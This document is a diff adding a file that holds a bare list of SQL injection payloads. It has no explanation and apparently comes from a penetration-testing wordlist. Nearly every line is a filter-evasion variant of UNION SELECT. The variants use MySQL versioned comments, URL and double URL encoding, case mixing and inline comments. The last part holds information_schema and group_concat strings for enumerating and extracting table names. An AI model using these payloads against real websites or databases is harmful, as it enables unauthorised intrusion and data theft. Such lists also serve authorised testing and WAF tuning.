@@ -1,0 +1,70 @@
+Info
+/**/ORDER/**/BY/**/
+/*!ORDER BY*/
+/*!50000ORDER*//**//*!50000BY*/
+/*!50000%55nIoN*/ /*!50000%53eLeCt*/
++union+distinct+select+
+/**//*!12345UNION SELECT*//**/
+/**/UNION/**//*!50000SELECT*//**/
+union /*!50000%53elect*/
++#1q%0AuNiOn all#qa%0A#%0AsEleCt
+/*!u%6eion*/ /*!se%6cect*/
+uni%0bon+se%0blect
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
+/*--*/union/*--*/select/*--*/
+/*!union*/+/*!select*/
+/**/union/**/select/**/
++%2F**/+Union/*!select*/
+/*!uNIOn*/ /*!SelECt*/
++union+distinctROW+select+
+UNIunionON+SELselectECT
+0%a0union%a0select%09
+%55nion/**/%53elect
+%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
+/*!union*//*--*//*!all*//*--*//*!select*/
+/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+union+sel%0bect
++#1q%0Aunion all#qa%0A#%0Aselect
+UNION(SELECT(column)FROM(table))
+%23xyz%0A%55nIOn%23xyz%0A%53eLecT+
+"union (select 1111,2222,3333)"
+"union (select 1111,2222,3333)"
+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/
++%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+
+/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/
+/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/
+/union\s+select/i
++UnIoN/*&a=*/SeLeCT/*&a=*/
++(UnIoN)+(SelECT)+
++’UnI”On’+'SeL”ECT’
++/*!UnIoN*/+/*!SeLeCt*/+
+uni%20union%20/*!select*/%20
+/**/union/*!50000select*/
+/*union*/union/*select*/select+
++un/**/ion+sel/**/ect+
+UNION/*&test=1*/SELECT/*&pwn=2*/
++UNunionION+SEselectLECT+
+%252f%252a*/union%252f%252a /select%252f%252a*/
+%2f**%2funion%2f**%2fselect%2f**%2f
+/*!UnIoN*/SeLecT+
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
+/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table
+CoNcAt()
+CONVERT(group_concat(table_name)+USING+latin1)
+%0AcOnCat()
+/*!50000cOnCat*/(/*!*/)
+unhex(hex(/*!12345concat*/(table_name)))
+/*!group_concat*/()
+group_concat(/*!*/)
+group_concat(/*!50000table_name*/)
+/*!group_concat*/(/*!50000table_name*/)
+/*!50000group_concat*/(/*!50000table_name*/)
+/*!12345GroUP_ConCat*/()
+/*!50000Gr%6fuP_c%6fnCAT*/()
+unhex(hex(/*!group_concat*/(/*!table_name*/)))
+unhex(hex(/*!12345group_concat*/(table_name)))
+unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))
+unhex(hex(/*!50000group_concat*/(/*!table_name*/)))
+convert(group_concat(table_name)+using+ascii)
+convert(group_concat(/*!12345table_name*/)+using+ascii)
